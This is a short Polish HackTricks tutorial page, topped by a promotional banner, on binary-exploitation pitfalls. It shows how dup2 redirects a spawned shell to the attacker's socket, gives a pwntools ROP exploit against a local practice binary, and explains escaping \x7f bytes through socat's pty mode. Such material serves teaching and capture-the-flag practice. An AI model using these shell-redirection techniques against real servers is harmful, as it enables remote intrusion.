# Powszechne Problemy Wykorzystywania

<details>

<summary><strong>Zacznij od zera i staÅ„ siÄ™ ekspertem w hakowaniu AWS dziÄ™ki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmujÄ…cej siÄ™ cyberbezpieczeÅ„stwem**? Chcesz zobaczyÄ‡, jak Twoja **firma jest reklamowana na HackTricks**? lub chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## FDs w Eksploatacji Zdalnej

Podczas wysyÅ‚ania exploitu do zdalnego serwera, ktÃ³ry wywoÅ‚uje **`system('/bin/sh')`** na przykÅ‚ad, ta operacja zostanie wykonana w procesie serwera, a `/bin/sh` bÄ™dzie oczekiwaÄ‡ danych wejÅ›ciowych z stdin (FD: `0`) oraz bÄ™dzie drukowaÄ‡ wyniki w stdout i stderr (FDs `1` i `2`). W zwiÄ…zku z tym atakujÄ…cy nie bÄ™dzie mÃ³gÅ‚ interaktywnie korzystaÄ‡ z powÅ‚oki.

Sposobem na rozwiÄ…zanie tego problemu jest zaÅ‚oÅ¼enie, Å¼e gdy serwer zostaÅ‚ uruchomiony, utworzyÅ‚ **numer FD `3`** (do nasÅ‚uchiwania), a nastÄ™pnie Twoje poÅ‚Ä…czenie bÄ™dzie w **numerze FD `4`**. Dlatego moÅ¼liwe jest uÅ¼ycie wywoÅ‚ania systemowego **`dup2`** do zduplikowania stdin (FD 0) i stdout (FD 1) w FD 4 (tego, ktÃ³ry jest poÅ‚Ä…czony z atakujÄ…cym), co umoÅ¼liwi nawiÄ…zanie kontaktu z powÅ‚okÄ… po jej wykonaniu.

[**PrzykÅ‚ad exploitu stÄ…d**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e socat juÅ¼ przesyÅ‚a **`stdin`** i **`stdout`** do gniazda. Jednak tryb `pty` **obejmuje znaki DELETE**. Dlatego jeÅ›li wyÅ›lesz `\x7f` (`DELETE` -) to **usunie poprzedni znak** twojego exploitu.

Aby ominÄ…Ä‡ to, **znak ucieczki `\x16` musi byÄ‡ poprzedzony przez kaÅ¼de `\x7f` wysÅ‚ane.**

**Tutaj moÅ¼esz** [**znaleÅºÄ‡ przykÅ‚ad tego zachowania**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**
